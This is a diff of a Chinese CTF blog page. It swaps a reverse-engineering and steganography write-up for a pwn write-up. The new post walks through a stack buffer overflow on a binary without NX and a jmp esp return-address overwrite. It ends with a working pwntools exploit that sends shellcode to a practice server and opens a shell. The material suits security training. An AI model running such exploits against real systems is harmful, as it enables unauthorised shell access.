@@ -6,24 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://purewhitywhite.github.io">
-  <title>Stage1Day4 Reverse&amp;Misc | pur3wh1tywhite</title>
+  <title>Stage1Day9 pwn | pur3wh1tywhite</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="Blue-whale OJReverse sign in、junior math、LSB&amp;amp;LSB2 writeup.">
-<meta name="keywords" content="blue-whale,Misc,Reverse">
+  <meta name="description" content="Blue-whale OJshellcode writeup.">
+<meta name="keywords" content="blue-whale,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Stage1Day4 Reverse&amp;Misc">
-<meta property="og:url" content="https://purewhitywhite.github.io/2020-03-11/Stage1Day4-Reverse-Misc/index.html">
+<meta property="og:title" content="Stage1Day9 pwn">
+<meta property="og:url" content="https://purewhitywhite.github.io/2020-03-16/Stage1Day9-pwn/index.html">
 <meta property="og:site_name" content="pur3wh1tywhite">
-<meta property="og:description" content="Blue-whale OJReverse sign in、junior math、LSB&amp;amp;LSB2 writeup.">
+<meta property="og:description" content="Blue-whale OJshellcode writeup.">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://s2.ax1x.com/2020/03/11/8Er0lF.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2020/03/11/8Eo4e0.jpg">
-<meta property="og:updated_time" content="2020-03-11T13:23:13.332Z">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8Ynvng.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8Y8loF.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8YGSfJ.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8YGkm6.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8YGwXq.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8YJQC4.md.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8YWVfJ.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/16/8Y4bcj.md.jpg">
+<meta property="og:updated_time" content="2020-03-16T13:45:36.792Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Stage1Day4 Reverse&amp;Misc">
-<meta name="twitter:description" content="Blue-whale OJReverse sign in、junior math、LSB&amp;amp;LSB2 writeup.">
-<meta name="twitter:image" content="https://s2.ax1x.com/2020/03/11/8Er0lF.jpg">
+<meta name="twitter:title" content="Stage1Day9 pwn">
+<meta name="twitter:description" content="Blue-whale OJshellcode writeup.">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/03/16/8Ynvng.jpg">
   
   
     <link rel="icon" href="/img/myicon.ico">
@@ -158,14 +164,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Stage1Day4-Reverse-Misc" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Stage1Day9-pwn" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Stage1Day4 Reverse&amp;Misc
+      Stage1Day9 pwn
     </h1>
   
 
@@ -175,7 +181,7 @@
       <span class="post-meta-item-icon" style="color:	#636363;font-size:14px;">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">1.3k字</span>
+        <span class="post-count">477字</span>
       </span>
     </span>
 
@@ -184,7 +190,7 @@
       <span class="post-meta-item-icon" style="color:	#636363;font-size:14px;">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">1分</span>
       </span>
     </span>
 </div>
@@ -202,8 +208,8 @@
 
 <!--显示阅读次数完毕-->
         
-        <a href="/2020-03-11/Stage1Day4-Reverse-Misc/" class="archive-article-date">
-  	<time datetime="2020-03-11T10:46:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-11</time>
+        <a href="/2020-03-16/Stage1Day9-pwn/" class="archive-article-date">
+  	<time datetime="2020-03-16T07:27:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-16</time>
 </a>
         
       </header>
@@ -212,49 +218,36 @@
 	
 	
       
-        <p>Blue-whale OJ<br>Reverse sign in、junior math、LSB&amp;LSB2 writeup.</p>
+        <p>Blue-whale OJ<br>shellcode writeup.</p>
 <a id="more"></a>
-<p>首先搞清楚一个一直都没弄清楚的问题，什么是逆向，什么是pwn（好像都是对着一堆汇编调来调去啊）？</p>
-<blockquote>
-<p>逆向工程（Reverse engineering），又称反向工程，是一种技术过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理。-<a href="https://ctf-wiki.github.io/ctf-wiki/reverse/introduction-zh/" target="_blank" rel="noopener">逆向工程-ctf-wiki</a></p>
-</blockquote>
-<blockquote>
-<p>根据我做过的一点逆向题目，感觉就是<del>把文件拖到IDA或者ollydbg里</del>先静态分析一些文件，包括它的一些代码混淆加壳等的，再动态调试之类的吧</p>
-</blockquote>
-<blockquote>
-<p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。</p>
-</blockquote>
-<blockquote>
-<p>我的理解就是利用程序存在的一些问题诸如堆、栈溢出，rop，uaf之类的，来执行shellcode，最后获得目标机器的root权限。</p>
-</blockquote>
-<p><a href="https://error4hack.com/x64dbg-vs-ollydbg-vs-ida-pro/" target="_blank" rel="noopener">x64dbg vs Ollydbg vs IDA Pro
-</a></p>
-<h1 id="Reverse-sign-in"><a href="#Reverse-sign-in" class="headerlink" title="Reverse sign in"></a>Reverse sign in</h1><p>用IDA打开之后直接按F5，main函数已经出来了：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400686((__int64)&amp;s) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="查看文件类型-amp-保护机制"><a href="#查看文件类型-amp-保护机制" class="headerlink" title="查看文件类型&amp;保护机制"></a>查看文件类型&amp;保护机制</h2><center><img src="https://s1.ax1x.com/2020/03/16/8Ynvng.jpg" alt="8Ynvng.jpg" border="0"></center>
+与第一关不同，没有开启NX（不可执行），此时可以尝试在数据所在内存页写入shellcode
 
-<p>可以看到程序是一个flag检验器，输入flag后先判断有没有32个字符，进而再判断将输入的值带入一个<code>sub_400686</code>函数后的返回值，若是1就说明是flag。<br>进入<code>sub_400686</code>看看：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_400686</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)(*(_BYTE *)(i + a1) ^ byte_400818[i]) != i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="反编译结果"><a href="#反编译结果" class="headerlink" title="反编译结果"></a>反编译结果</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804851A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80484EB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello "</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>意思是将a1（输入的值）逐位与<code>byte_400818</code>这个数组逐位进行<code>^（异或）</code>操作，如果他们的结果==循环变量i，那么就返回1（输入的flag对了）。<br>看看<code>byte_400818</code>：
-<center><img src="https://s2.ax1x.com/2020/03/11/8Er0lF.jpg" alt="8Er0lF.jpg" border="0"></center></p>
+<p>可以看到与第一关一样read函数发生缓冲区溢出，buf大小为0x1Ch，读入了0x100h，可以尝试在执行read函数时写入shellcode。于是问题的关键就在于：如何找到buf在栈中的储存位置（以便修改返回地址指向shellcode）？</p>
+<h2 id="动态调试确定buf在栈中位置"><a href="#动态调试确定buf在栈中位置" class="headerlink" title="动态调试确定buf在栈中位置"></a>动态调试确定buf在栈中位置</h2><ul>
+<li>使用IDA的Remote Linux Debugger实现对pwn3的动态调试<br>step1:将IDA目录\dbgsrv\里的<code>linux_server</code>文件放在linux里pwn3所在的同一目录（若是64位文件则使用<code>linux_server64</code>）</li>
+</ul>
+<p>step2:在linux下运行该文件:<code>./linux_server</code>开始监听<br>step3:在IDA菜单栏→Debugger→switchdebugger中选择linuxdebugger，并完成配置</p>
+<hr>
+<p>在<code>push 0</code>处设置断点，可以看到buf的地址以作为read的参数入栈：<br><center><img src="https://s1.ax1x.com/2020/03/16/8Y8loF.jpg" alt="8Y8loF.jpg" border="0"></center><br>向buf输入“hello”，查看并验证栈中的情况：<br><center><img src="https://s1.ax1x.com/2020/03/16/8YGSfJ.jpg" alt="8YGSfJ.jpg" border="0"></center><br><center><img src="https://s1.ax1x.com/2020/03/16/8YGkm6.jpg" alt="8YGkm6.jpg" border="0"></center><br>可以看到hello已经写入buf地址的栈中（逆序是因为小端序）</p>
+<hr>
+<p>然而再次运行、调试发现buf在栈中的位置并不固定：<br><center><img src="https://s1.ax1x.com/2020/03/16/8YGwXq.jpg" alt="8YGwXq.jpg" border="0"></center></p>
+<h2 id="动态定位shellcode"><a href="#动态定位shellcode" class="headerlink" title="动态定位shellcode"></a>动态定位shellcode</h2><center><img src="https://s1.ax1x.com/2020/03/16/8YJQC4.md.jpg" alt="8YJQC4.jpg" border="0"></center>
+
+<p>解决方案：利用<code>jmp esp</code>运行shellcode<a href="https://blog.csdn.net/lixiangminghate/article/details/53333710" title="原理解析" target="_blank" rel="noopener">原理解析</a><br>思路：利用任意一个<code>jmp esp</code>指令的地址覆盖返回地址→覆盖buf和ebp→在返回地址之后紧跟着布置shellcode→函数在返回后将被定向去执行内存中的<code>jmp esp</code>指令→<code>jmp esp</code>指令执行后，处理器会到栈区函数返回地址之后的地方取指令执行，即shellcode</p>
 <blockquote>
-<p>x dup(y)，x是重复的次数，（）里的y是要重复的数<br>刚好32个字符，那么可以编写脚本来找flag，思路是这样的，flag[i]^byte_400818[i] == i，那么flag[i] == byte_400818[i]^i</p>
+<p><code>jmp esp</code>的机器码为FFE4，在文件中的地址为08048667。<br><center><img src="https://s1.ax1x.com/2020/03/16/8YWVfJ.jpg" alt="8YWVfJ.jpg" border="0"></center></p>
 </blockquote>
-<p>代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先转十进制</span></span><br><span class="line">d = [<span class="number">102</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">127</span>, <span class="number">60</span>, <span class="number">54</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">59</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">124</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">96</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">127</span>, <span class="number">113</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">117</span>, <span class="number">42</span>, <span class="number">98</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    print(chr(d[i] ^ i), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<table><tr><td bgcolor="#87CEFA">payload:(0x1ch+0x4h)*a +[jmp esp]+shellcode</td></tr></table>
 
-<h1 id="junior-math"><a href="#junior-math" class="headerlink" title="junior math"></a>junior math</h1><p>按F5查看伪代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;byte_602080);</span><br><span class="line">  sub_4005D6();</span><br><span class="line">  sub_40063F();</span><br><span class="line">  sub_4006A8();</span><br><span class="line">  sub_400711();</span><br><span class="line">  sub_40077A();</span><br><span class="line">  sub_4007E3();</span><br><span class="line">  sub_40084C();</span><br><span class="line">  sub_4008B5();</span><br><span class="line">  sub_400918();</span><br><span class="line">  sub_400981();</span><br><span class="line">  sub_4009EA();</span><br><span class="line">  sub_400A53();</span><br><span class="line">  sub_400ABC();</span><br><span class="line">  sub_400B25();</span><br><span class="line">  <span class="keyword">if</span> ( dword_602064 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="number">32</span>*<span class="string">'a'</span> + p32(<span class="number">0x08048667</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>问题：print为何还输入了a2 a3两个参数？</p>
-</blockquote>
-<p>看到输入flag后进行了一堆函数运算，最后判断<code>dword_602064</code>这个东西是0的话输入值即为flag。<br>进入一个函数看看：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_4005D6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = (byte_602080 - <span class="number">147</span>) * byte_602080 != <span class="number">-4590</span> || (byte_602082 - <span class="number">147</span>) * byte_602082 != <span class="number">-4850</span>;</span><br><span class="line">  result = v0 | (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602064;</span><br><span class="line">  dword_602064 |= v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<center><img src="https://s1.ax1x.com/2020/03/16/8Y4bcj.md.jpg" alt="8Y4bcj.jpg" border="0"></center>
 
-<p>看到这个函数计算了输入字符串的第1位（byte_602080）进行运算后与-4590进行判断，如果这个将第一位带入左边的式子计算结果不等于-4590，那么||（或）的左侧就是一个1，如果等于的话就是0。返回值result貌似没有起到作用不分析，然后将<code>dword_602064</code>与v0进行逐位或，结果存入v0。<br>看了其他的函数结构都一样，变化的就是测试的是输入字符串的第几位。可以看出我们每一次都要满足v0是0，这样才能保证v0与<code>dword_602064</code>逐位或之后才不会出现1（出现1就错了），那么就要式输入字符串的每一位都满足每个函数里的一元二次运算。<br>试着挑一个算了算，<code>(byte_602080 - 147) * byte_602080 = -4590</code>的一个解为102，查ascii表为f，就很显然了。把每一位结果都算出来查ascii即可得到flag。</p>
-<h1 id="LSB-amp-LSB2"><a href="#LSB-amp-LSB2" class="headerlink" title="LSB&amp;LSB2"></a>LSB&amp;LSB2</h1><h2 id="最低有效位（LSB）的原理："><a href="#最低有效位（LSB）的原理：" class="headerlink" title="最低有效位（LSB）的原理："></a>最低有效位（LSB）的原理：</h2><p>因为每个图片的颜色都是由“红”、“绿”、“蓝”三种颜色组成，图片中的其他颜色均可以由这三种颜色混合而成。然而PNG的每种颜色的大小在储存位中占8bit，而LSB隐写原理就是把每种颜色的最后一位进行改写，但是改写后的图片和原图相比，在人的眼中是没有区别的。</p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>stegsolve打开图片后调整到Red plane0页面就可以看到这个二维码，扫码即得到flag。<br><center><img src="https://s1.ax1x.com/2020/03/11/8Eo4e0.jpg" alt="8Eo4e0.jpg" border="0"></center><br>LSB2的话用lint里提示的<code>zsteg -a secret.png</code>即可看到flag。</p>
+
+
 
       
       
@@ -271,11 +264,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Misc</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Reverse</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -294,18 +283,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020-03-12/Stage1Day5-Web/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Stage1Day5 Web
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020-03-10/Stage1Day3-Web-Misc/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Stage1Day3 Web&amp;Misc</div>
+    <a href="/2020-03-15/Stage1Day8-Misc/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Stage1Day8 Misc</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -332,7 +312,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse-sign-in"><span class="toc-number">1.</span> <span class="toc-text">Reverse sign in</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#junior-math"><span class="toc-number">2.</span> <span class="toc-text">junior math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LSB-amp-LSB2"><span class="toc-number">3.</span> <span class="toc-text">LSB&amp;LSB2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#最低有效位（LSB）的原理："><span class="toc-number">3.1.</span> <span class="toc-text">最低有效位（LSB）的原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">3.2.</span> <span class="toc-text">题解</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode"><span class="toc-number">1.</span> <span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看文件类型-amp-保护机制"><span class="toc-number">1.1.</span> <span class="toc-text">查看文件类型&amp;保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反编译结果"><span class="toc-number">1.2.</span> <span class="toc-text">反编译结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试确定buf在栈中位置"><span class="toc-number">1.3.</span> <span class="toc-text">动态调试确定buf在栈中位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态定位shellcode"><span class="toc-number">1.4.</span> <span class="toc-text">动态定位shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -358,7 +338,7 @@ if(true){
   	repo: 'blog_comment',
   	owner: 'purewhitywhite',
   	admin: ['purewhitywhite'],
-  	id: 'Wed Mar 11 2020 18:46:44 GMT+0800',
+  	id: 'Mon Mar 16 2020 15:27:39 GMT+0800',
   	distractionFreeMode: 'true'
 })
 gitalk.render('gitalk-container') 
